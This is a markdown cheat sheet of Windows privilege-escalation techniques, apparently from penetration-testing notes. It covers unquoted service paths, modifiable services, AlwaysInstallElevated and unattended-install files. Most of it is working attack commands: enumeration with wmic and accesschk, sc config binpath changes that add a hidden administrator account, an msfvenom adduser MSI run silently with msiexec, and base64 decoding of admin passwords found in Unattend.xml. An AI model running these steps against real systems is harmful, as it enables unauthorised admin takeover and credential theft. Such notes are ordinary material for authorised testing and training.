# Other Techniques

## Trusted Service Paths
If a path to an executable is not in quotations and has spaces in it, take a look!  

#### URLs:
1. https://toshellandback.com/2015/11/24/ms-priv-esc/

#### Metasploit:
        exploit/windows/local/trusted_service_path

#### Steps:

1. List all unquoted paths, containing spaces.

        wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

        --> C:\Program Files (x86)\Privacyware\Privatefirewall 7.0\pfsvc.exe

    https://technet.microsoft.com/en-us/library/cc753525(v=ws.11).aspx

2. Check the permission on the path.

        icacls "C:\Program Files (x86)\Privacyware"

3. Service permissions.

        accesschk.exe -uwcqv SERVICE_NAME

## Vulnerable Services
Ability to modify windows services, their properties.

#### URLs:
1. https://toshellandback.com/2015/11/24/ms-priv-esc/

#### Metasploit
        exploit/windows/local/service_permissions

#### Steps:

1. Check services, allowed to be modified...

    1a) by any user

        accesschk.exe -uwcqv "Authenticated Users" * /accepteula

    1b) by your low privilege user

        accesschk.exe -uwcqv "USERNAME" * /accepteula

2. If we find "SERVICE_ALL_ACCESS", we are winning!

        RW PFNET
            SERVICE_ALL_ACCESS

3. Utilize service control (SC)

        sc qc PFNET (PROCESS_NAME)

4. Add root user

        sc config PFNET binpath= "net user rottenadmin P@ssword123! /add"
        sc stop PFNET
        sc start PFNET
        sc config PFNET binpath= "net localgroup Administrators rottenadmin /add"
        sc stop PFNET
        sc start PFNET

## AlwaysInstallElevated

#### URLs:
1. https://toshellandback.com/2015/11/24/ms-priv-esc/

#### Metasploit:
        exploit/windows/local/always_install_elevated

#### Steps:

1. Check registry keys

        reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
        reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

    Should be both on 0x1

2. Add new user, create msi-file.

        msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o rotten.msi

3. Run the msi-file

        msiexec /quiet /qn /i PATH_TO_MSI_FILE

## Unattended Installs

#### URLs:
1. https://toshellandback.com/2015/11/24/ms-priv-esc/

#### Metasploit:
        post/windows/gather/enum_unattend

#### Steps:

1. Directories to search for the files.

        C:\Windows\Panther\
        C:\Windows\Panther\Unattend\
        C:\Windows\System32\
        C:\Windows\System32\sysprep\

    In addition to Unattend.xml files, be on the lookout for sysprep.xml and sysprep.inf files on the file system.

2. Search for "<UserAccounts>"-tag

        <UserAccounts>
            <LocalAccounts>
                <LocalAccount>
                    <Password>
                        <Value>UEBzc3dvcmQxMjMhUGFzc3dvcmQ=</Value>
                        <PlainText>false</PlainText>
                    </Password>
                    <Description>Local Administrator</Description>
                    <DisplayName>Administrator</DisplayName>
                    <Group>Administrators</Group>
                    <Name>Administrator</Name>
                </LocalAccount>
            </LocalAccounts>
        </UserAccounts>

3. Decode the password

        echo "BASE64_STRING" | base64 -d

    Remove the "Password" at the end, it is always appended.
